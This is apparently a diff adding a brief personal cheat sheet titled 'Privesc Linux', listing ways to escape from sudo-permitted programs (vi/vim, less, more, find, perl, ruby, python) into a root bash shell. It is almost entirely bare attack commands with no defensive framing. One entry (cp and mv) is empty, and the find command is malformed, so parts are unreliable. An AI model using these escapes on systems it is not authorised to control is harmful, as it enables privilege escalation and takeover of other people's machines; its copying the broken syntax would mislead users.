@@ -1,0 +1,34 @@
+Privesc Linux
+
+SUDO{
+
+using vi/vim?
+sudo vi/vim 
+:shell
+
+using less
+!bash
+
+using more 
+!bash
+:!bash
+
+using cp and mv
+
+
+using find 
+sudo find /etc bash -i \;
+
+perl
+sudo perl 
+exec "/bin/bash";
+ctrl-d
+
+ruby
+exec "/bin/bash"
+
+python
+import os
+os.system('/bin/bash')
+
+}
